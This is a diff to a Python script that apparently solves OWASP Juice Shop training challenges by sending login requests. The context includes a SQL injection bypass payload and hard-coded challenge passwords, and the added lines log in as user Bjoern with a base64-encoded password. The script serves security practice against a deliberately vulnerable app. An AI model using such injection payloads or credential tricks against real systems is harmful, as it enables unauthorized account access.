@@ -26,3 +26,5 @@ requests.post(url+'/rest/user/login', data={'email':'amy@juice-sh.op','password'
 requests.post(url+'/rest/user/login', data={'email':'bender@juice-sh.op\'--','password':'a'})
 # ---- Login Jim (Log in with Jim's user account.)
 requests.post(url+'/rest/user/login', data={'email':'jim@juice-sh.op','password':'ncc-1701'})
+# ---- Login Bjoern (Log in with Bjoern's Gmail account without previously changing his password, applying SQL Injection, or hacking his Google account.)
+requests.post(url+'/rest/user/login', data={'email':'bjoern.kimminich@gmail.com','password':'bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI='})
